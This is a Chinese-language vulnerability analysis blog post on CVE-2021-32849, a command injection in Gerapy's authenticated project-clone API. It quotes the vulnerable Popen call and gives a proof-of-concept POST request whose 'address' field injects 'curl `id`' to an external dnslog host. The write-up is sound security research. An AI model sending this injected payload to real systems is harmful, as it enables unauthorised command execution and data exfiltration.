---
title: Gerapy clone 后台远程命令执行漏洞【CVE-2021-32849】
date: 2025-04-14 10:33:52
tags:
- Gerapy clone
- CVE-2021-32849
- 远程命令执行
categories:
  - [漏洞分析]
---
@[TOC](Gerapy clone 后台远程命令执行漏洞【CVE-2021-32849】)

该漏洞的利用需要授权，虽然危害较大，但是感觉还是比较鸡肋的。
项目地址：[Gerapy](https://github.com/Gerapy/Gerapy)
该漏洞出现在项目的`gerapy/server/core/views.py`中的`project_clone`函数中：
<!--more-->
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/9eb4aefb4396f43fdf3008db2f01d093.png)
```python
@api_view(['POST'])
@permission_classes([IsAuthenticated])
def project_clone(request):
    """
    clone project from github
    :param request: request object
    :return: json
    """
    if request.method == 'POST':
        data = json.loads(request.body)
        address = data.get('address')
        if not address.startswith('http'):
            return JsonResponse({'status': False})
        address = address + '.git' if not address.endswith('.git') else address
        cmd = 'git clone {address} {target}'.format(address=address, target=join(PROJECTS_FOLDER, Path(address).stem))
        logger.debug('clone cmd %s', cmd)
        p = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        stdout, stderr = bytes2str(p.stdout.read()), bytes2str(p.stderr.read())
        logger.debug('clone run result %s', stdout)
        if stderr: logger.error(stderr)
        return JsonResponse({'status': True}) if not stderr else JsonResponse({'status': False})

```
注意到第339行使用了Popen函数，搜一下这个函数的作用：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/799f6635745b9e6dfc81b445ddb3b5f2.png)

说白了可以用来执行系统命令，我们来验证一下：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/5d258bd7ccdbd60712f869e1848ed6be.png)
成功弹出来了计算器。
所以如果cmd参数可控，那么就可以用来执行系统命令，
cmd的赋值操作：
```python
cmd = 'git clone {address} {target}'.format(address=address, target=join(PROJECTS_FOLDER, Path(address).stem))
```
address或者target可控就可以执行命令
address的赋值操作：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/3fc852ebbd311913f9e1987b778fb0d7.png)
观察这一串代码，首先将请求体的数据加载为python字典，然后获取其中address键的值赋值给address，同时还要满足address的值以http开头，否则就直接退出程序了。最后将address拼接.git赋值个address。从这个过程可以看到，address的值是我们完全可控的，也就意味着我们可以用来执行系统命令。
```shell
POST /api/project/clone HTTP/1.1
Host: 
Content-Length: 61
Accept: application/json, text/plain, */*
Authorization: Token 0fb31a60728efd8e6398349bea36fa7629bd8df0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close

{"address":"http://127.0.0.1;curl `id`.rwbmny.dnslog.cn"}
```
访问的api信息在这儿：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/01e29197029a0735c2b4675d5678692a.png)
不幸的是，这个操作需要认证，看到请求头中的Authorization标头了吗，无语凝噎：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/e8b49ac4d5289c12a97c47bd7c7b0e98.png)
顺着这个思路其实还有一系列的利用链条，有兴趣的可以自行下载源码审计。
